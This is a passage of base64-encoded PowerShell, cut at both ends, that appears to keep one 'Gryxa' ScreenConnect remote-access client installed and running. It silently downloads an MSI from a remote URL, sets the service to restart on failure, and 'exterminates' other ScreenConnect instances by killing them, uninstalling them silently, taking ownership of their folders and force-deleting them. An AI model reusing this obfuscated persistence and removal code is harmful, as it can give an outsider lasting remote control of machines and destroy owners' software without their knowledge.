eGl0Cn0KCmZ1bmN0aW9uIEludm9rZS1Hcnl4YUVuc3VyZSB7CiAgICAjIE80MCBIQVJEIFJVTEU6
IGlmIEFOWSBub24tc2V2cnogU2NyZWVuQ29ubmVjdCBpcyBSdW5uaW5nIC0+IE5FVkVSIC94IG9y
IC9pLgogICAgIyBGUCBkcmlmdCB3aGlsZSBSdW5uaW5nIGlzIGxvZ2dlZCBvbmx5IChubyByZWlu
c3RhbGwpLgogICAgIyBSZWluc3RhbGwgT05MWSB3aGVuIG5vdGhpbmcgR3J5eGEtbGlrZSBpcyBS
dW5uaW5nIChvciAtRm9yY2UpLgogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGgg
JFdvcmtEaXIpKSB7CiAgICAgICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAk
V29ya0RpciAtRm9yY2UgfCBPdXQtTnVsbAogICAgfQogICAgJGxvZyA9IEpvaW4tUGF0aCAkV29y
a0RpciAnZ3J5eGFfZW5zdXJlLmxvZycKICAgIGZ1bmN0aW9uIEdMb2coW3N0cmluZ10kbSkgewog
ICAgICAgICRsaW5lID0gJ3swfSB7MX0nIC1mIChHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRk
IEhIOm1tOnNzJyksICRtCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICRsaW5lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICB9CgogICAgJG9sZEZw
ID0gR2V0LUdyeXhhRnAKICAgICRkb0RlZXAgPSBbYm9vbF0oJERlZXAgLW9yICRGb3JjZSAtb3Ig
KCRFeHRyYSAtbWF0Y2ggJyg/aSlkZWVwfGZvcmNlJykpCiAgICBHTG9nICJncnl4YV9lbnN1cmVf
YmVnaW4gZGVlcD0kZG9EZWVwIGZvcmNlPSRGb3JjZSBvbGRfZnA9JG9sZEZwIgoKICAgICRydW5u
aW5nRnAgPSBGaW5kLVJ1bm5pbmdHcnl4YUZwCiAgICBpZiAoJHJ1bm5pbmdGcCkgewogICAgICAg
IFNldC1Hcnl4YUZwICRydW5uaW5nRnAKICAgICAgICBHTG9nICJhbHJlYWR5X3J1bm5pbmdfZnA9
JHJ1bm5pbmdGcCBsb2NrX25vX3JlaW5zdGFsbCIKICAgICAgICBpZiAoLW5vdCAkRm9yY2UpIHsK
ICAgICAgICAgICAgaWYgKCRkb0RlZXApIHsKICAgICAgICAgICAgICAgICRtc2kgPSBKb2luLVBh
dGggJFdvcmtEaXIgJ3BrZ19ncnl4YS5tc2knCiAgICAgICAgICAgICAgICAkdG1wID0gSm9pbi1Q
YXRoICRlbnY6VEVNUCAoInNjX2dyeXhhX3swfS5tc2kiIC1mIFtndWlkXTo6TmV3R3VpZCgpLlRv
U3RyaW5nKCdOJykpCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICRj
dXJsID0gSm9pbi1QYXRoICRlbnY6U3lzdGVtUm9vdCAnU3lzdGVtMzJcY3VybC5leGUnCiAgICAg
ICAgICAgICAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkY3VybCkpIHsgJGN1cmwgPSAnY3Vy
bC5leGUnIH0KICAgICAgICAgICAgICAgICAgICAmICRjdXJsIC1MIC0tc3NsLW5vLXJldm9rZSAt
LWNvbm5lY3QtdGltZW91dCAyNSAtLW1heC10aW1lIDMwMCAtbyAkdG1wICRzY3JpcHQ6R3J5eGFN
c2lVcmwgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICAgICAgaWYgKChUZXN0LVBhdGgg
JHRtcCkgLWFuZCAoKEdldC1JdGVtICR0bXApLkxlbmd0aCAtZ3QgMTAwMDAwMCkpIHsKICAgICAg
ICAgICAgICAgICAgICAgICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0aCAkdG1wIC1EZXN0aW5hdGlv
biAkbXNpIC1Gb3JjZQogICAgICAgICAgICAgICAgICAgICAgICAkcHJvZE5hbWUgPSBHZXQtTXNp
UHJvcGVydHkgJG1zaSAnUHJvZHVjdE5hbWUnCiAgICAgICAgICAgICAgICAgICAgICAgICRuZXdG
cCA9IEdldC1GcEZyb21Qcm9kdWN0TmFtZSAkcHJvZE5hbWUKICAgICAgICAgICAgICAgICAgICAg
ICAgaWYgKCRuZXdGcCAtYW5kICgkbmV3RnAgLW5lICRydW5uaW5nRnApKSB7CiAgICAgICAgICAg
ICAgICAgICAgICAgICAgICBHTG9nICJmcF9kcmlmdF9JR05PUkVEX3doaWxlX3J1bm5pbmcgcnVu
bmluZz0kcnVubmluZ0ZwIG1zaT0kbmV3RnAiCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxz
ZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHTG9nICJkZWVwX2ZwX21hdGNoPSRydW5u
aW5nRnAiCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAg
ICAgICAgICAgICAgICB9IGNhdGNoIHsgR0xvZyAiZGVlcF9tc2lfc29mdGZhaWw9JF8iIH0KICAg
ICAgICAgICAgICAgIGZpbmFsbHkgeyBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJHRtcCAtRm9y
Y2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfQogICAgICAgICAgICB9CiAgICAgICAg
ICAgIHJldHVybiAiSEVBTFRIWXwkcnVubmluZ0ZwfHJ1bm5pbmc9MXxuby1yZWluc3RhbGwiCiAg
ICAgICAgfQogICAgICAgIEdMb2cgJ2ZvcmNlX3JlaW5zdGFsbF9kZXNwaXRlX3J1bm5pbmcnCiAg
ICB9CgogICAgaWYgKC1ub3QgJEZvcmNlIC1hbmQgKFRlc3QtQW55Tm9uU2V2cnpTY1J1bm5pbmcp
KSB7CiAgICAgICAgJHJ1bm5pbmdGcCA9IEZpbmQtUnVubmluZ0dyeXhhRnAKICAgICAgICBTZXQt
R3J5eGFGcCAkcnVubmluZ0ZwCiAgICAgICAgcmV0dXJuICJIRUFMVEhZfCRydW5uaW5nRnB8cnVu
bmluZz0xfGd1YXJkIgogICAgfQoKICAgIGlmICgtbm90ICRkb0RlZXAgLWFuZCAtbm90ICRGb3Jj
ZSkgewogICAgICAgIGlmIChUZXN0LVNjUnVubmluZyAkb2xkRnApIHsgcmV0dXJuICJIRUFMVEhZ
fCRvbGRGcHxydW5uaW5nPTEiIH0KICAgICAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVu
dCAoJG9sZEZwKSIKICAgICAgICAmIHNjLmV4ZSBjb25maWcgJG5hbWUgc3RhcnQ9IGF1dG8gMj4m
MSB8IE91dC1OdWxsCiAgICAgICAgJiBzYy5leGUgc3RhcnQgJG5hbWUgMj4mMSB8IE91dC1OdWxs
CiAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNAogICAgICAgIGlmIChUZXN0LVNjUnVubmlu
ZyAkb2xkRnApIHsgR0xvZyAnbGlnaHRfc3RhcnRlZF9vayc7IHJldHVybiAiSEVBTFRIWXwkb2xk
RnB8c3RhcnRlZD0xIiB9CiAgICAgICAgaWYgKEZpbmQtUHJvZHVjdEd1aWQgJG9sZEZwKSB7CiAg
ICAgICAgICAgICRudWxsID0gUmVwYWlyLVNDU2VydmljZSAkb2xkRnAKICAgICAgICAgICAgR0xv
ZyAnbGlnaHRfcmVwYWlyX2RvbmUnCiAgICAgICAgICAgIGlmIChUZXN0LVNjUnVubmluZyAkb2xk
RnApIHsgcmV0dXJuICJIRUFMVEhZfCRvbGRGcHxyZXBhaXJlZD0xIiB9CiAgICAgICAgfQogICAg
ICAgIEdMb2cgJ2xpZ2h0X2VzY2FsYXRlX2luc3RhbGxfbWlzc2luZycKICAgICAgICAkZG9EZWVw
ID0gJHRydWUKICAgIH0KCiAgICBpZiAoLW5vdCAkRm9yY2UgLWFuZCAtbm90IChUZXN0LUdyeXhh
UmVpbnN0YWxsQWxsb3dlZCkpIHsKICAgICAgICBHTG9nICdyZWluc3RhbGxfcmF0ZV9saW1pdGVk
JwogICAgICAgIHJldHVybiAiVU5IRUFMVEhZfCRvbGRGcHxyYXRlLWxpbWl0ZWQiCiAgICB9Cgog
ICAgJG1zaSA9IEpvaW4tUGF0aCAkV29ya0RpciAncGtnX2dyeXhhLm1zaScKICAgICR0bXAgPSBK
b2luLVBhdGggJGVudjpURU1QICgic2NfZ3J5eGFfezB9Lm1zaSIgLWYgW2d1aWRdOjpOZXdHdWlk
KCkuVG9TdHJpbmcoJ04nKSkKICAgICRmZXRjaGVkID0gJGZhbHNlCiAgICB0cnkgewogICAgICAg
ICRjdXJsID0gSm9pbi1QYXRoICRlbnY6U3lzdGVtUm9vdCAnU3lzdGVtMzJcY3VybC5leGUnCiAg
ICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkY3VybCkpIHsgJGN1cmwgPSAnY3VybC5leGUnIH0K
ICAgICAgICAmICRjdXJsIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCAyNSAt
LW1heC10aW1lIDMwMCAtbyAkdG1wICRzY3JpcHQ6R3J5eGFNc2lVcmwgMj4mMSB8IE91dC1OdWxs
CiAgICAgICAgaWYgKChUZXN0LVBhdGggJHRtcCkgLWFuZCAoKEdldC1JdGVtICR0bXApLkxlbmd0
aCAtZ3QgMTAwMDAwMCkpIHsKICAgICAgICAgICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0aCAkdG1w
IC1EZXN0aW5hdGlvbiAkbXNpIC1Gb3JjZQogICAgICAgICAgICAkZmV0Y2hlZCA9ICR0cnVlCiAg
ICAgICAgICAgIEdMb2cgKCJtc2lfZmV0Y2hlZCBieXRlcz17MH0iIC1mIChHZXQtSXRlbSAkbXNp
KS5MZW5ndGgpCiAgICAgICAgfQogICAgfSBjYXRjaCB7IEdMb2cgIm1zaV9mZXRjaF9lcnI9JF8i
IH0KICAgIGZpbmFsbHkgeyBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJHRtcCAtRm9yY2UgLUVy
cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfQoKICAgIGlmICgtbm90ICRmZXRjaGVkIC1hbmQg
KFRlc3QtUGF0aCAkbXNpKSAtYW5kICgoR2V0LUl0ZW0gJG1zaSkuTGVuZ3RoIC1ndCAxMDAwMDAw
KSkgewogICAgICAgICRmZXRjaGVkID0gJHRydWUKICAgICAgICBHTG9nICdtc2lfdXNpbmdfY2Fj
aGUnCiAgICB9CiAgICBpZiAoLW5vdCAkZmV0Y2hlZCkgewogICAgICAgIEdMb2cgJ21zaV9mZXRj
aF9GQUlMJwogICAgICAgIHJldHVybiAiVU5IRUFMVEhZfCRvbGRGcHxtc2ktZmV0Y2gtZmFpbCIK
ICAgIH0KCiAgICAkcHJvZE5hbWUgPSBHZXQtTXNpUHJvcGVydHkgJG1zaSAnUHJvZHVjdE5hbWUn
CiAgICAkbmV3RnAgPSBHZXQtRnBGcm9tUHJvZHVjdE5hbWUgJHByb2ROYW1lCiAgICBpZiAoLW5v
dCAkbmV3RnApIHsKICAgICAgICBHTG9nICJtc2lfZnBfcGFyc2VfRkFJTCBuYW1lPSRwcm9kTmFt
ZSIKICAgICAgICByZXR1cm4gIlVOSEVBTFRIWXwkb2xkRnB8bXNpLWZwLXBhcnNlLWZhaWwiCiAg
ICB9CiAgICBHTG9nICJtc2lfZnA9JG5ld0ZwIHByb2R1Y3Q9JHByb2ROYW1lIgoKICAgIGlmICgt
bm90ICRGb3JjZSAtYW5kIChUZXN0LUFueU5vblNldnJ6U2NSdW5uaW5nKSkgewogICAgICAgICRy
dW5uaW5nRnAgPSBGaW5kLVJ1bm5pbmdHcnl4YUZwCiAgICAgICAgU2V0LUdyeXhhRnAgJHJ1bm5p
bmdGcAogICAgICAgIEdMb2cgJ2Fib3J0X2luc3RhbGxfYmVjYW1lX3J1bm5pbmcnCiAgICAgICAg
cmV0dXJuICJIRUFMVEhZfCRydW5uaW5nRnB8cnVubmluZz0xfGFib3J0LWluc3RhbGwiCiAgICB9
CgogICAgTWFyay1Hcnl4YVJlaW5zdGFsbAogICAgaWYgKEZpbmQtUHJvZHVjdEd1aWQgJG5ld0Zw
KSB7CiAgICAgICAgR0xvZyAicmVwYWlyX2JlZm9yZV9pbnN0YWxsPSRuZXdGcCIKICAgICAgICAk
bnVsbCA9IFJlcGFpci1TQ1NlcnZpY2UgJG5ld0ZwCiAgICAgICAgaWYgKFRlc3QtU2NSdW5uaW5n
ICRuZXdGcCkgewogICAgICAgICAgICBTZXQtR3J5eGFGcCAkbmV3RnAKICAgICAgICAgICAgcmV0
dXJuICJIRUFMVEhZfCRuZXdGcHxyZXBhaXJlZD0xIgogICAgICAgIH0KICAgICAgICBHTG9nICJ1
bmluc3RhbGxfc3R1Y2s9JG5ld0ZwIgogICAgICAgICRudWxsID0gVW5pbnN0YWxsLVNjRmluZ2Vy
cHJpbnQgJG5ld0ZwCiAgICB9CiAgICBpZiAoJG9sZEZwIC1hbmQgJG9sZEZwIC1uZSAkbmV3RnAg
LWFuZCAoRmluZC1Qcm9kdWN0R3VpZCAkb2xkRnApKSB7CiAgICAgICAgR0xvZyAidW5pbnN0YWxs
X29sZF9jZmc9JG9sZEZwIgogICAgICAgICRudWxsID0gVW5pbnN0YWxsLVNjRmluZ2VycHJpbnQg
JG9sZEZwCiAgICB9CgogICAgU2V0LUdyeXhhRnAgJG5ld0ZwCiAgICAkZXhpdCA9IEluc3RhbGwt
R3J5eGFGcm9tTXNpICRtc2kKICAgIEdMb2cgIm1zaWV4ZWNfZXhpdD0kZXhpdCIKCiAgICAkbmFt
ZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJG5ld0ZwKSIKICAgICYgc2MuZXhlIGNvbmZpZyAk
bmFtZSBzdGFydD0gYXV0byAyPiYxIHwgT3V0LU51bGwKICAgICYgc2MuZXhlIGZhaWx1cmUgJG5h
bWUgcmVzZXQ9IDg2NDAwIGFjdGlvbnM9IHJlc3RhcnQvMzAwMC9yZXN0YXJ0LzMwMDAvcmVzdGFy
dC8zMDAwIDI+JjEgfCBPdXQtTnVsbAogICAgJiBzYy5leGUgc3RhcnQgJG5hbWUgMj4mMSB8IE91
dC1OdWxsCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA1CiAgICAmIHNjLmV4ZSBzdGFydCAkbmFt
ZSAyPiYxIHwgT3V0LU51bGwKICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDUKCiAgICBmb3JlYWNo
ICgka2ZwIGluICRzY3JpcHQ6U2V2cnpLZWVwKSB7CiAgICAgICAgJGtuID0gIlNjcmVlbkNvbm5l
Y3QgQ2xpZW50ICgka2ZwKSIKICAgICAgICAmIHNjLmV4ZSBzdGFydCAka24gMj4mMSB8IE91dC1O
dWxsCiAgICAgICAgaWYgKC1ub3QgKEdldC1TZXJ2aWNlIC1OYW1lICRrbiAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZSkpIHsgJG51bGwgPSBSZXBhaXItU0NTZXJ2aWNlICRrZnAgfQogICAg
fQoKICAgIGlmICgtbm90IChUZXN0LVNjUnVubmluZyAkbmV3RnApKSB7ICRudWxsID0gUmVwYWly
LVNDU2VydmljZSAkbmV3RnAgfQoKICAgIGlmIChUZXN0LVNjUnVubmluZyAkbmV3RnApIHsKICAg
ICAgICBHTG9nICdwb3N0X3J1bm5pbmdfb2snCiAgICAgICAgcmV0dXJuICJIRUFMVEhZfCRuZXdG
cHxpbnN0YWxsZWQ9MSIKICAgIH0KICAgIEdMb2cgJ3Bvc3Rfc3RpbGxfZG93bicKICAgIHJldHVy
biAiVU5IRUFMVEhZfCRuZXdGcHxzdGlsbC1ub3QtcnVubmluZyIKfQoKZnVuY3Rpb24gSW52b2tl
LUV4dGVybWluYXRlIHsKICAgICMgTDc6IHRydWUgcmVtb3ZhbC4gQ29ycmVjdCBXT1c2NDMyTm9k
ZSBoaXZlICsgbXNpZXhlYyArIFVuaW5zdGFsbFN0cmluZwogICAgIyBmYWxsYmFjayArIGZvcmNl
IGRpciBudWtlLiBLZWVwIHNldnJ6K2FsdCtjdXJyZW50IGdyeXhhIEZQIChncnl4YS5jZmcpLgog
ICAgIyBPNDE6IHN5bmMgUnVubmluZyBHcnl4YSBGUCBpbnRvIGNmZyBCRUZPUkUgYW55IGtpbGw7
IG5ldmVyIGtpbGwgU0MgcHJvY3MKICAgICMgd2l0aG91dCBhIGZvcmVpZ24gRlAgaW4gcGF0aC9j
bWRsaW5lIChudWxsIHBhdGggd2FzIGtpbGxpbmcgR3J5eGEgZXZlcnkgdGljaykuCiAgICAkbG9n
ID0gSm9pbi1QYXRoICRXb3JrRGlyICdleHRlcm1pbmF0ZS5sb2cnCiAgICAkcnVubmluZ0cgPSBG
aW5kLVJ1bm5pbmdHcnl4YUZwCiAgICBpZiAoJHJ1bm5pbmdHKSB7IFNldC1Hcnl4YUZwICRydW5u
aW5nRyB9CiAgICAka2VlcCA9IEAoR2V0LUtlZXBGaW5nZXJwcmludHMpCiAgICAkbiA9IEB7IHN2
YyA9IDA7IHByb2MgPSAwOyBkaXIgPSAwOyBwcm9kdWN0ID0gMDsgcm1tID0gMDsgZmFpbCA9IDAg
fQogICAgZnVuY3Rpb24gTG9nKFtzdHJpbmddJG0pIHsKICAgICAgICAkbGluZSA9ICd7MH0gezF9
JyAtZiAoR2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbTpzcycpLCAkbQogICAgICAg
IEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAkbGluZSAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZQogICAgICAgICMgTzQxOiBkbyBOT1QgV3JpdGUtT3V0cHV0IExvZyBs
aW5lcyAocG9sbHV0ZXMgZm9yIC9mIGNhbGxlcnMpCiAgICB9CiAgICAjIFByb3RlY3QgR3J5eGEg
ZHVyaW5nIHN0YXJ0IHJhY2U6IGFueSBsaXZlIFNDIHByb2Nlc3Mgd2hvc2UgcGF0aCBlbWJlZHMg
YQogICAgIyBub24tc2V2cnogRlAgaXMgYSBrZWVwZXIgZXZlbiBpZiB0aGUgc2VydmljZSBpcyBu
b3QgUnVubmluZyB5ZXQuCiAgICBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAtRmlsdGVy
ICJOYW1lIGxpa2UgJ1NjcmVlbkNvbm5lY3QlJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgJGJsb2IgPSAiJChbc3RyaW5nXSRfLkV4ZWN1
dGFibGVQYXRoKSAkKFtzdHJpbmddJF8uQ29tbWFuZExpbmUpIgogICAgICAgIGlmICgkYmxvYiAt
bWF0Y2ggJ1NjcmVlbkNvbm5lY3QgQ2xpZW50IFwoKFswLTlhLWZBLUZdezE2fSlcKScpIHsKICAg
ICAgICAgICAgJGZwID0gJE1hdGNoZXNbMV0uVG9Mb3dlcigpCiAgICAgICAgICAgIGlmICgkZnAg
LW5vdGluICRzY3JpcHQ6U2V2cnpLZWVwIC1hbmQgJGZwIC1ub3RpbiAka2VlcCkgewogICAgICAg
ICAgICAgICAgJGtlZXAgKz0gJGZwCiAgICAgICAgICAgICAgICBTZXQtR3J5eGFGcCAkZnAKICAg
ICAgICAgICAgICAgIExvZyAia2VlcF9hZGRfZnJvbV9wcm9jIGZwPSRmcCIKICAgICAgICAgICAg
fQogICAgICAgIH0KICAgIH0KICAgIGZ1bmN0aW9uIElzLUtlZXBlcihbc3RyaW5nXSRzKSB7CiAg
ICAgICAgaWYgKC1ub3QgJHMpIHsgcmV0dXJuICRmYWxzZSB9CiAgICAgICAgZm9yZWFjaCAoJGsg
aW4gJGtlZXApIHsgaWYgKCRzIC1saWtlICIqJGsqIikgeyByZXR1cm4gJHRydWUgfSB9CiAgICAg
ICAgcmV0dXJuICRmYWxzZQogICAgfQogICAgZnVuY3Rpb24gRm9yY2UtUmVtb3ZlRGlyKFtzdHJp
bmddJGQpIHsKICAgICAgICBpZiAoLW5vdCAkZCAtb3IgLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFs
UGF0aCAkZCkpIHsgcmV0dXJuICR0cnVlIH0KICAgICAgICBHZXQtQ2ltSW5zdGFuY2UgV2luMzJf
UHJvY2VzcyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgICAgIFdoZXJl
LU9iamVjdCB7ICRfLkV4ZWN1dGFibGVQYXRoIC1hbmQgJF8uRXhlY3V0YWJsZVBhdGguU3RhcnRz
V2l0aCgkZCwgW1N0cmluZ0NvbXBhcmlzb25dOjpPcmRpbmFsSWdub3JlQ2FzZSkgfSB8CiAgICAg
ICAgICAgIEZvckVhY2gtT2JqZWN0IHsgU3RvcC1Qcm9jZXNzIC1JZCAkXy5Qcm9jZXNzSWQgLUZv
cmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIH0KICAgICAgICAmIHRha2Vvd24uZXhl
IC9GICRkIC9SIC9EIFkgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgJiBpY2FjbHMuZXhlICRkIC9n
cmFudCAnKlMtMS01LTMyLTU0NDpGJyAvVCAvQyAvUSAyPiYxIHwgT3V0LU51bGwKICAgICAgICAm
IGljYWNscy5leGUgJGQgL2dyYW50ICdBZG1pbmlzdHJhdG9yczpGJyAvVCAvQyAvUSAyPiYxIHwg
T3V0LU51bGwKICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGQgLVJlY3Vyc2UgLUZv
cmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgaWYgKFRlc3QtUGF0aCAt
TGl0ZXJhbFBhdGggJGQpIHsKICAgICAgICAgICAgY21kLmV4ZSAvYyAiYXR0cmliIC1oIC1zIC1y
IC9zIC9kIGAiJGRcKi4qYCIiIDI+JjEgfCBPdXQtTnVsbAogICAgICAgICAgICBjbWQuZXhlIC9j
ICJybWRpciAvcyAvcSBgIiRkYCIiIDI+JjEgfCBPdXQtTnVsbAogICAgICAgIH0KICAgICAgICBp
ZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkgewogICAgICAgICAgICAkZW1wdHkgPSBKb2lu
LVBhdGggJGVudjpURU1QICgib3duX2VtcHR5XyIgKyBbZ3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmlu
ZygnTicpKQogICAgICAgICAgICBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRl
bXB0eSAtRm9yY2UgfCBPdXQtTnVsbAogICAgICAgICAgICAmIHJvYm9jb3B5LmV4ZSAkZW1wdHkg
JGQgL01JUiAvUjowIC9XOjAgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgICAgIFJlbW92ZS1JdGVt
IC1MaXRlcmFsUGF0aCAkZW1wdHkgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
CiAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZCAtUmVjdXJzZSAtRm9yY2Ug
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICB9CiAgICAgICAgcmV0dXJuIC1u
b3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpCiAgICB9CiAgICBmdW5jdGlvbiBVbmluc3Rh
bGwtUHJvZHVjdEtleSgka2V5KSB7CiAgICAgICAgJGd1aWQgPSAka2V5LlBTQ2hpbGROYW1lCiAg
ICAgICAgJHByb3AgPSBHZXQtSXRlbVByb3BlcnR5ICRrZXkuUFNQYXRoIC1FcnJvckFjdGlvbiBT
aWxlbnRseUNvbnRpbnVlCiAgICAgICAgJGRuID0gJHByb3AuRGlzcGxheU5hbWUKICAgICAgICBp
ZiAoJGd1aWQgLWxpa2UgJ3sqfScpIHsKICAgICAgICAgICAgJHAgPSBTdGFydC1Qcm9jZXNzIG1z
aWV4ZWMuZXhlIC1Bcmd1bWVudExpc3QgIi94ICRndWlkIC9xbiAvbm9yZXN0YXJ0IFJFQk9PVD1S
ZWFsbHlTdXBwcmVzcyIgLVdhaXQgLVBhc3NUaHJ1IC1XaW5kb3dTdHlsZSBIaWRkZW4KICAgICAg
ICAgICAgTG9nICJwcm9kdWN0X21zaWV4ZWMgWyRkbl0gZ3VpZD0kZ3VpZCBleGl0PSQoJHAuRXhp
dENvZGUpIgogICAgICAgICAgICBpZiAoJHAuRXhpdENvZGUgLWluIDAsIDE2MDUsIDE2MTQsIDMw
MTApIHsgcmV0dXJuICR0cnVlIH0KICAgICAgICB9CiAgICAgICAgJHVzID0gJHByb3AuVW5pbnN0
YWxsU3RyaW5nCiAgICAgICAgaWYgKCR1cykgewogICAgICAgICAgICB0cnkgewogICAgICAgICAg
ICAgICAgaWYgKCR1cyAtbWF0Y2ggJyg/aSltc2lleGVjJykgewogICAgICAgICAgICAgICAgICAg
ICRhcmdzID0gKCR1cyAtcmVwbGFjZSAnKD9pKV4uKm1zaWV4ZWMoXC5leGUpP1xzKicsICcnKQog
ICAgICAgICAgICAgICAgICAgIGlmICgkYXJncyAtbm90bWF0Y2ggJy9xbicpIHsgJGFyZ3MgPSAi
JGFyZ3MgL3FuIC9ub3Jlc3RhcnQiIH0KICAgICAgICAgICAgICAgICAgICAkcCA9IFN0YXJ0LVBy
b2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAkYXJncyAtV2FpdCAtUGFzc1RocnUgLVdp
bmRvd1N0eWxlIEhpZGRlbgogICAgICAgICAgICAgICAgICAgIExvZyAicHJvZHVjdF91bmluc3Rh
bGxzdHJpbmdfbXNpIFskZG5dIGV4aXQ9JCgkcC5FeGl0Q29kZSkiCiAgICAgICAgICAgICAgICAg
ICAgcmV0dXJuICgkcC5FeGl0Q29kZSAtaW4gMCwgMTYwNSwgMTYxNCwgMzAxMCkKICAgICAgICAg
ICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJHAgPSBTdGFydC1Qcm9jZXNzIGNt
ZC5leGUgLUFyZ3VtZW50TGlzdCAiL2MgJHVzIC9TIC9zaWxlbnQgL3F1aWV0IC9xbiIgLVdhaXQg
LVBhc3NUaHJ1IC1XaW5kb3dTdHlsZSBIaWRkZW4KICAgICAgICAgICAgICAgICAgICBMb2cgInBy
b2R1Y3RfdW5pbnN0YWxsc3RyaW5nX2V4ZSBbJGRuXSBleGl0PSQoJHAuRXhpdENvZGUpIgogICAg
ICAgICAgICAgICAgICAgIHJldHVybiAoJHAuRXhpdENvZGUgLWVxIDApCiAgICAgICAgICAgICAg
ICB9CiAgICAgICAgICAgIH0gY2F0Y2ggeyBMb2cgInByb2R1Y3RfdW5pbnN0YWxsc3RyaW5nX0ZB
SUwgWyRkbl0gJF8iIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuICRmYWxzZQogICAgfQoKICAg
IExvZyAnZXh0ZXJtaW5hdGVfZW5naW5lX0w3X2JlZ2luJwoKICAgICMgMS4gZm9yZWlnbiBTQyBw
cm9kdWN0cyBmcm9tIEJPVEggY29ycmVjdCBBUlAgaGl2ZXMKICAgICRzZWVuID0gQHt9CiAgICBm
b3JlYWNoICgkcm9vdCBpbiAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7CiAgICAgICAgaWYgKC1u
b3QgKFRlc3QtUGF0aCAkcm9vdCkpIHsgTG9nICJoaXZlX21pc3NpbmcgJHJvb3QiOyBjb250aW51
ZSB9CiAgICAgICAgTG9nICJoaXZlX3NjYW4gJHJvb3QiCiAgICAgICAgR2V0LUNoaWxkSXRlbSAk
cm9vdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAg
ICAgICAgICAgJHByb3AgPSBHZXQtSXRlbVByb3BlcnR5ICRfLlBTUGF0aCAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZQogICAgICAgICAgICAkZG4gPSAkcHJvcC5EaXNwbGF5TmFtZQogICAg
ICAgICAgICBpZiAoLW5vdCAkZG4pIHsgcmV0dXJuIH0KICAgICAgICAgICAgaWYgKCRkbiAtbm90
bWF0Y2ggJyg/aSlTY3JlZW5Db25uZWN0XHMrQ2xpZW50XHMqXCgoWzAtOUEtRmEtZl17MTZ9KVwp
JykgeyByZXR1cm4gfQogICAgICAgICAgICAkZnAgPSAkTWF0Y2hlc1sxXS5Ub0xvd2VyKCkKICAg
ICAgICAgICAgaWYgKCRmcCAtaW4gJGtlZXApIHsgcmV0dXJuIH0KICAgICAgICAgICAgaWYgKCRz
ZWVuLkNvbnRhaW5zS2V5KCRfLlBTQ2hpbGROYW1lKSkgeyByZXR1cm4gfQogICAgICAgICAgICAk
c2VlblskXy5QU0NoaWxkTmFtZV0gPSAkdHJ1ZQogICAgICAgICAgICBpZiAoVW5pbnN0YWxsLVBy
b2R1Y3RLZXkgJF8pIHsgJG4ucHJvZHVjdCsrIH0gZWxzZSB7ICRuLmZhaWwrKzsgTG9nICJwcm9k
dWN0X1JFTU9WRV9GQUlMRUQgWyRkbl0iIH0KICAgICAgICB9CiAgICB9CgogICAgIyAyLiBmb3Jl
aWduIFNDIHNlcnZpY2VzCiAgICBmb3JlYWNoICgkc3ZjIGluIChHZXQtU2VydmljZSAtRXJyb3JB
